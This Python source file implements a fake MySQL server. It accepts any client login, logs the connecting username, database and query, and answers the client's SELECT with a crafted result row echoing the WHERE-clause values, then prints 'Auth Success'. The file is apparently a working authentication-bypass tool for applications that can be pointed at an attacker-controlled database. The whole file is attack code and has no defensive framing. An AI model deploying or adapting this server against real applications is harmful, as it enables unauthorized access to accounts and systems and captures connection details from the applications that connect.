import asyncore
import socket 
import asynchat 
from struct import Struct 
import re

class MySQL(object): 
    def __init__(self):
        self.packetNumber = 0

    def serverGreeting(self):
        protocol = 10 
        version = 'MySQLAuthServer\0' 
        threadID = 51 
        salts = ['MySQLAuth\0', 'MySQLAuthSrv\0'] 
        serverCapabilities = 0xf7df 
        serverLanguage = 45 
        serverStatus = 0x0002 
        extendedServerCapabilities = 0x81bf 
        authPluginLength = 21 
        unused = ('\x00' * 6) + ('\x07') + ('\x00' * 3) 
        authPlugin = 'mysql_native_password\0'  
        greeting = Struct('B').pack(protocol)
        greeting = greeting + Struct('{0}s'.format(len(version))).pack(version.encode('utf-8'))
        greeting = greeting + Struct('B').pack(threadID) + Struct('xxx').pack()
        greeting = greeting + Struct('{0}s'.format(len(salts[0]))).pack(salts[0].encode('utf-8'))
        greeting = greeting + serverCapabilities.to_bytes(2, 'little')
        greeting = greeting + Struct('B').pack(serverLanguage)
        greeting = greeting + serverStatus.to_bytes(2, 'little')
        greeting = greeting + extendedServerCapabilities.to_bytes(2, 'little')
        greeting = greeting + Struct('B').pack(authPluginLength)
        greeting = greeting + unused.encode('utf-8')
        greeting = greeting + Struct('{0}s'.format(len(salts[1]))).pack(salts[1].encode('utf-8'))
        greeting = greeting + Struct('{0}s'.format(len(authPlugin))).pack(authPlugin.encode('utf-8'))
        header = Struct('<Hbb').pack(len(greeting), 0, self.packetNumber) 
        packet = header + greeting
        return packet 

    def responseOK(self):
        self.packetNumber = self.packetNumber + 2
        affectedRows = 0
        serverStatus = 0x0002
        warnings = 0
        ok = affectedRows.to_bytes(3, 'little')
        ok = ok + serverStatus.to_bytes(2, 'little')
        ok = ok + warnings.to_bytes(2, 'little')
        header = Struct('<Hbb').pack(len(ok), 0, self.packetNumber)
        packet = header + ok
        return packet
        
    def auth(self, query, database):
        self.packetNumber = 1
        fields = re.findall(r'SELECT(.*)FROM', query, re.IGNORECASE)[0].replace(' ', '').split(',')
        header = Struct('<Hbb').pack(len(Struct('B').pack(len(fields))), 0, self.packetNumber)
        packet = header + Struct('B').pack(len(fields))
        self.packetNumber = self.packetNumber + 1
        catalog = 'def'
        table = re.findall(r'FROM(.*)WHERE', query, re.IGNORECASE)[0].replace(' ', '')
        charset = 45
        length = 1020
        fieldType = 253 
        flags = 0x0000
        decimals = 0
        for field in fields:
            description = Struct('B').pack(len(catalog)) + Struct('{0}s'.format(len(catalog))).pack(catalog.encode('utf-8')) + Struct('B').pack(len(database)) + Struct('{0}s'.format(len(database))).pack(database.encode('utf-8')) + Struct('B').pack(len(table)) + Struct('{0}s'.format(len(table))).pack(table.encode('utf-8')) + Struct('B').pack(len(table)) + Struct('{0}s'.format(len(table))).pack(table.encode('utf-8')) + Struct('B').pack(len(field)) + Struct('{0}s'.format(len(field))).pack(field.encode('utf-8')) + Struct('B').pack(len(field)) + Struct('{0}s'.format(len(field))).pack(field.encode('utf-8')) + Struct('B').pack(len(charset.to_bytes(2, 'little') + length.to_bytes(4, 'little') + Struct('B').pack(fieldType) + flags.to_bytes(2, 'little') + Struct('B').pack(decimals) + Struct('xx').pack())) + charset.to_bytes(2, 'little') + length.to_bytes(4, 'little') + Struct('B').pack(fieldType) + flags.to_bytes(2, 'little') + Struct('B').pack(decimals) + Struct('xx').pack()
            header = Struct('<Hbb').pack(len(description), 0, self.packetNumber)
            packet = packet + header + description
            self.packetNumber = self.packetNumber + 1
        eof = 254
        warnings = 0
        serverStatus = 0x0022
        header = Struct('<Hbb').pack(len(Struct('B').pack(eof) + warnings.to_bytes(2, 'little') + serverStatus.to_bytes(2, 'little')), 0, self.packetNumber)
        packet = packet + header + Struct('B').pack(eof) + warnings.to_bytes(2, 'little') + serverStatus.to_bytes(2, 'little')
        self.packetNumber = self.packetNumber + 1
        row = b''
        for value in re.findall(r'=\'(.*?)\'', query.replace(' ', ''), re.IGNORECASE):
            row = row + Struct('B').pack(len(value)) + Struct('{0}s'.format(len(value))).pack(value.encode('utf-8'))
        header = Struct('<Hbb').pack(len(row), 0, self.packetNumber)
        packet = packet + header + row
        self.packetNumber = self.packetNumber + 1
        eof = 254
        warnings = 0
        serverStatus = 0x0022
        header = Struct('<Hbb').pack(len(Struct('B').pack(eof) + warnings.to_bytes(2, 'little') + serverStatus.to_bytes(2, 'little')), 0, self.packetNumber)
        packet = packet + header + Struct('B').pack(eof) + warnings.to_bytes(2, 'little') + serverStatus.to_bytes(2, 'little')
        return packet

class MySQLServerHandler(asynchat.async_chat):
    def __init__(self, pair):
        self.sock, self.address = pair 
        self.host, self.port = self.address 
        self.ibuffer = []
        self.mysql = MySQL()
        self.state = 'length'
        self.subState = ['auth', 'query', 'quit']
        self.subStateCounter = 0
        asynchat.async_chat.__init__(self, sock = self.sock)
        self.set_terminator(3)
        asynchat.async_chat.push(self, self.mysql.serverGreeting())
    
    def collect_incoming_data(self, data):
        self.ibuffer.append(data)
    
    def found_terminator(self):
        if self.state == 'length':
            packetLength = self.getPacketLength()
            if packetLength < 65536:
                self.set_terminator(packetLength)
                self.state = 'data'
        elif self.state == 'data':
            if self.subState[self.subStateCounter] == 'auth':
                self.set_terminator(3)
                asynchat.async_chat.push(self, self.mysql.responseOK())
                self.database = self.getDatabase()
                self.username = self.getUsername()
                print('[+] Username: {0}'.format(self.username))
                print('[+] Database: {0}'.format(self.database))
                self.subStateCounter = self.subStateCounter + 1
                self.state = 'length'
            elif self.subState[self.subStateCounter] == 'query':
                self.set_terminator(3)
                self.query = self.getQuery()
                print('[+] Query: {0}'.format(self.query))
                asynchat.async_chat.push(self, self.mysql.auth(self.query, self.database))
                self.subStateCounter = self.subStateCounter + 1
                self.state = 'length'
            elif self.subState[self.subStateCounter] == 'quit':
                exit('[+] Auth Success')
        self.ibuffer = []
                
    def getPacketLength(self):
        length = int.from_bytes(self.ibuffer[0][0:3], 'little') + 1
        return length

    def getQuery(self):
        for i in range(0, len(self.ibuffer[0])):
            if self.ibuffer[0][i] == 3:
                start = i + 1
        return self.ibuffer[0][start:].decode('utf-8')
    
    def getDatabase(self):
        i = 0
        database = None
        while i < len(self.ibuffer[0]) and not database:
            if self.ibuffer[0][i] == 20:
                database = (self.ibuffer[0][i + 21:])[:self.ibuffer[0][i + 21:].find(b'\x00')].decode('utf-8')
            i = i + 1
        return database
    
    def getUsername(self):
        i = 0
        username = None
        while i < len(self.ibuffer[0]) and not username:
            if self.ibuffer[0][i] == 20:
                username = (self.ibuffer[0][:i-1])[self.ibuffer[0][:i-1].rfind(b'\x00') + 1:].decode('utf-8')
            i = i + 1
        return username

class Server(asyncore.dispatcher):
    def __init__(self, host = '', port = 3306): 
        asyncore.dispatcher.__init__(self)
        self.host = host 
        self.port = port 
        self.create() 

    def create(self): 
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM) 
        self.set_reuse_addr() 
        self.bind((self.host, self.port)) 
        self.listen(5) 

    def handle_accept(self): 
        pair = self.accept() 
        if pair is not None: 
            sock, address = pair 
            host, port = address 
            print('[+] {0}:{1}'.format(host, port)) 
            MySQLServerHandler(pair)

if __name__ == '__main__':
    server = Server()
    asyncore.loop()
